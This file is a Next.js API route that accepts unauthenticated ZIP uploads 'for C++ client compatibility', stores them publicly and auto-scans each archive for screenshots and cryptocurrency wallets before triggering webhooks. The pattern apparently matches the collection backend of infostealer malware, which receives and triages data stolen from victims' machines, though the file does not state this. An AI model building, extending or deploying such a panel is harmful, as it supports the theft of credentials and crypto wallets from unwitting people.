import { NextRequest, NextResponse } from 'next/server';
import { writeFile, mkdir } from 'fs/promises';
import path from 'path';
import { existsSync } from 'fs';
import crypto from 'crypto';
import { cookies } from 'next/headers';
import { verifyToken } from '@/lib/auth';
import { triggerWebhooks } from '../webhooks/route';
import { ActivityLogger } from '@/lib/activity-logger';

const MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB

export async function POST(request: NextRequest) {
  try {
    // Check authentication - but allow uploads without auth for C++ client compatibility
    const cookieStore = await cookies();
    const token = cookieStore.get('auth-token')?.value;

    // Optional authentication - log whether request is authenticated
    if (token) {
      const payload = verifyToken(token);
      if (payload) {
        console.log('Authenticated upload from user:', payload.userId);
      }
    } else {
      console.log('Unauthenticated upload (possibly from C++ client)');
    }
    const formData = await request.formData();
    const file = formData.get('zipfile') as File;

    if (!file) {
      return NextResponse.json(
        { success: false, message: 'No file uploaded' },
        { status: 400 }
      );
    }

    // Validate file size
    if (file.size > MAX_FILE_SIZE) {
      return NextResponse.json(
        { success: false, message: 'File size exceeds 100MB limit' },
        { status: 400 }
      );
    }

    // Validate file type
    if (!file.name.endsWith('.zip')) {
      return NextResponse.json(
        { success: false, message: 'Only ZIP files are allowed' },
        { status: 400 }
      );
    }

    // Validate filename to prevent path traversal
    const filename = file.name;
    if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
      return NextResponse.json(
        { success: false, message: 'Invalid filename' },
        { status: 400 }
      );
    }

    // Generate secure random filename
    const randomName = `${crypto.randomBytes(8).toString('hex')}_${Date.now()}.zip`;

    // Create uploads directory if it doesn't exist
    const uploadsDir = path.join(process.cwd(), 'public', 'uploads');
    if (!existsSync(uploadsDir)) {
      await mkdir(uploadsDir, { recursive: true });
    }

    // Convert file to buffer and save
    const bytes = await file.arrayBuffer();
    const buffer = Buffer.from(bytes);

    const filePath = path.join(uploadsDir, randomName);
    await writeFile(filePath, buffer);

    const uploadData = {
      filename: randomName,
      originalName: file.name,
      size: file.size,
      uploadTime: new Date().toISOString(),
      url: `/uploads/${randomName}`
    };

    // Log activity
    await ActivityLogger.fileUploaded(randomName, file.size);
    
    // Automatically analyze the uploaded ZIP file for screenshots and wallets
    try {
      const { analyzeZipFile } = await import('@/lib/zip-analyzer');
      const analysis = await analyzeZipFile(filePath);
      
      // Store analysis results (you could cache this or include in response)
      console.log('Auto-analysis complete:', {
        filename: randomName,
        hasScreenshot: analysis.hasScreenshot,
        hasCryptoWallet: analysis.hasCryptoWallet,
        walletTypes: analysis.walletTypes
      });
    } catch (error) {
      console.error('Auto-analysis failed:', error);
    }
    
    // Trigger webhooks for file upload event
    await triggerWebhooks('file.uploaded', uploadData);

    return NextResponse.json({
      success: true,
      message: 'File uploaded successfully',
      data: uploadData
    });
  } catch (error) {
    console.error('Upload error:', error);
    return NextResponse.json(
      { success: false, message: 'Failed to upload file' },
      { status: 500 }
    );
  }
}

export const config = {
  api: {
    bodyParser: false,
  },
};
